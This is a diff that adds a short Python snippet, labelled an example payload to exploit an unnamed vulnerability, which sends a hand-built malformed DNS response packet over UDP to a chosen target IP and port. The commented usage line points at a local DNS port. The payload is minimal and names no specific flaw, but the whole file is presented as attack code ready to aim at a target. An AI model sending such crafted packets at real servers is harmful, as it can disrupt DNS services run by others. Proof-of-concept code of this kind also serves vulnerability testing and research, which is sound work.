@@ -1,0 +1,13 @@
+```python
+import socket
+
+# Example payload to exploit the vulnerability
+def send_invalid_dns_response(target_ip, target_port):
+    # Crafting an invalid DNS response packet
+    invalid_response = b'\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'  # Example of a malformed DNS response
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        sock.sendto(invalid_response, (target_ip, target_port))
+
+# Usage
+# send_invalid_dns_response('127.0.0.1', 53)  # Replace with target IP and port
+```
